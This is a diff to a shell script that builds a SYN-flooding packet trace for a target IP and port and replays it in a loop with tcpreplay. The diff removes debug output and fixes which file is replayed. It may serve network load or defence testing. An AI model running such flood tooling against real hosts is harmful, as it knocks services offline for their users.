@@ -36,20 +36,16 @@ then
     exit
 fi
 
-echo "1"
 pktNum=$(echo "($rate * 10000 * $floodPeriod / 500000 + 1) * 500000" | bc)
 traceName="SYN_flooding_${pktNum}_${pktLen}_${dstIP}_${dstPort}.pcap"
 if [ ! -e $traceName ]
 then
-    echo "2"
     ./traceGen.py -n $pktNum -l $pktLen -a $dstIP -p $dstPort -o $traceName
 fi
-echo "3"
-read
 
 while true
 do
-    tcpreplay -M $rate -i $interface $filename &
+    tcpreplay -M $rate -i $interface $traceName &
     pid=$!
     sleep $floodPeriod
     kill -9 $pid
